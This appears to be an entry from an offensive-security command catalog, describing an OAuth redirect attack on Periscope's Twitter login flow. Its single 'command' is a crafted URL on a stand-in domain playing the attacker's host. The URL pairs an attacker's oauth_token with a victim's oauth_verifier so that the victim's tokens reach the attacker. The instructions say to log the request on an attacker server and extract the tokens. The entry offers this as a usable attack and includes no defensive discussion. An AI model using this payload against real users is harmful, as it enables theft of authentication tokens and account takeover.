---
id: cmd-periscope-victim-redirect
data: >-
  https://www.example.com/www.periscope.tv/i/twitter/loginComplete?oauth_token=[attacker's
  oauth token]&oauth_verifier=[victim's oauth verifier]
tags:
  - token-leak
  - oauth
type: command
output: Tokens sent to attacker domain
executor: http
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:24.666Z'
verified: false
validated: true
submitted: true
---
# victim-redirect-url

## Command

```http
https://www.example.com/www.periscope.tv/i/twitter/loginComplete?oauth_token=[attacker's oauth token]&oauth_verifier=[victim's oauth verifier]
```

## Description

Redirect URL after victim authorization, leaking tokens to attacker's domain.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| oauth_token | Captured token | Yes |
| oauth_verifier | Victim's verifier | Yes |

## Examples

### Basic Usage

Log this GET request on attacker server.

## Expected Output

Query parameters with tokens for extraction.

## Related

- [[commands/oauth-redirect-response]]
